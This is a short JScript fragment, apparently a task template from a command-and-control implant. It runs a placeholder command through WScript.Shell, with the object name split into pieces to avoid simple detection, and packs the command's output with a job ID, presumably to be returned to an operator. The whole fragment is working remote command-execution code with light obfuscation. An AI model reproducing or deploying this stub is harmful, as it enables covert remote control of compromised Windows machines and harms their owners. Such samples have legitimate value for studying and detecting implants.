r = new ActiveXObject("WScrip" + "t.She" + "ll").Exec("~CMD~");
a = "";
while (!r.StdOut.AtEndOfStream) {
    a = r.StdOut.ReadAll();
}
c = "~JOB_ID~" + "|" + a;